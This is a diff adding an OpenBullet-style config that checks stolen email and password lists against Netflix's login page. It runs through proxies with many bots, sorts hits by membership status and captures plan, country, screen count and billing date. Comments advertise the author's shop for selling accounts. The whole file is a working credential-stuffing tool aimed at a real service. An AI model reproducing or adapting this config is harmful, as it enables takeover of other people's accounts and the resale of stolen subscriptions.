@@ -1,0 +1,85 @@
+[SETTINGS]
+{
+  "Name": "Netflix By-IpProxeis",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-31T19:39:09.0223904+02:00",
+  "AdditionalInfo": "",
+  "Author": "By-IpProxeis",
+  "Version": "1.3.5 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Transparent": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#https://shoppy.gg/@IpMarket REQUEST GET "https://www.netflix.com/ph-en/Login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+
+#Auth PARSE "<SOURCE>" LR "name=\"authURL\" value=\"" "\"" -> VAR "authURL" 
+
+#https://shoppy.gg/@IpMarket FUNCTION URLEncode "<authURL>" -> VAR "AUTH" 
+
+#lOGIN REQUEST POST "https://www.netflix.com/Login?nextpage=https%3A%2F%2Fwww.netflix.com%2FYourAccount" 
+  CONTENT "authURL=<AUTH>&email=<USER>&password=<PASS>&withFields=email%2Cpassword%2CrememberMe%2CnextPage%2CshowPassword&rememberMe=True&flow=websiteSignUp&mode=login&action=loginAction&nextPage=https%3A%2F%2Fwww.netflix.com%2FYourAccount&showPassword=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Referer: https://www.netflix.com/ph-en/Login" 
+
+#CHECK KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "\":\"unrecognized_email\"},\"" 
+    KEY "\"value\":\"incorrect_password\"}" 
+  KEYCHAIN Success OR 
+    KEY "\"membershipStatus\":\"CURRENT_MEMBER\"" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "\"membershipStatus\":\"NEVER_MEMBER\"" 
+    KEY "\"membershipStatus\":\"FORMER_MEMBER\"" 
+
+#اهلا PARSE "<SOURCE>" LR "\"currentPlanName\":\"" "\"" -> CAP "Sub" 
+
+#ومرحبا_ PARSE "<SOURCE>" LR "\",\"currentCountry\":\"" "\"" -> CAP "Country" 
+
+#بكم PARSE "<SOURCE>" LR "\"maxStreams\":" "," -> CAP "Screens" 
+
+#اذهب_الي PARSE "<SOURCE>" LR "\"hasHD\":" "," -> CAP "Has HD" 
+
+#متجري PARSE "<SOURCE>" LR "\"hasUHD\":" "," -> CAP "Has UHD" 
+
+#وقم_بالشراء_الان^^ PARSE "<SOURCE>" LR "\"nextBillingDate\":\"" "\"" -> VAR "Billing" "" " By^^IpProxeis" 
+
+#By^^IpProxeis FUNCTION Replace "\\x2F" "/" "<Billing>" -> CAP "ReNew" 
+
